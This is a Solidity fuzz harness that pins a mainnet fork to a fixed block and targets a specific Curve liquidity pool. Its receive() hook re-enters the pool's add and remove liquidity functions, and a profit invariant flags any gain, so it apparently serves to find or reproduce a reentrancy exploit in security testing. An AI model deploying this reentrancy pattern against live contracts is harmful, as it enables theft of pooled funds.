// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import {FuzzBase} from "fuzzlib/FuzzBase.sol";

import {ICurve} from "src/interfaces/ICurve.sol";
import {WETH9} from "src/interfaces/WETH9.sol";

contract Fuzz is FuzzBase {
    WETH9 WETH = WETH9(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    ICurve pool = ICurve(0x9848482da3Ee3076165ce6497eDA906E66bB85C5);

    uint256 initialBalance;

    bool reentrancyEnabled = true;
    uint8 reentrancyFunction;
    uint128 reentrancyAmount;

    constructor() payable {
        vm.roll(17806055);
        vm.warp(1690722623);

        initialBalance = address(this).balance;
    }

    function testProfit() public {
        uint256 balance = address(this).balance;
        gte(initialBalance, balance, "Profit test");
    }

    function addLiquidity(uint128 _amount) public {
        _amount = uint128(clampBetween(_amount, 0, address(this).balance));

        uint256[2] memory amount;
        amount[0] = _amount;
        amount[1] = 0;

        pool.add_liquidity{value: _amount}(amount, 0);
    }

    function removeLiquidity(uint128 _amount) public {
        _amount = uint128(
            clampBetween(_amount, 0, pool.balanceOf(address(this)))
        );

        uint256[2] memory amount;
        amount[0] = 0;
        amount[1] = 0;

        pool.remove_liquidity(_amount, amount);
    }

    function setReentrancyEnabled(bool _reentrancyEnabled) public {
        reentrancyEnabled = _reentrancyEnabled;
    }

    function setReentrancyFunction(uint8 _reentrancyFunction) public {
        reentrancyFunction = _reentrancyFunction;
    }

    function setReentrancyAmount(uint128 _reentrancyAmount) public {
        reentrancyAmount = _reentrancyAmount;
    }

    receive() external payable {
        if (reentrancyEnabled) {
            uint256 functionId = (reentrancyFunction % 2 == 1) ? 0 : 1;

            if (reentrancyFunction == 0) {
                addLiquidity(reentrancyAmount);
            } else if (reentrancyFunction == 1) {
                removeLiquidity(reentrancyAmount);
            }
        }
    }

}
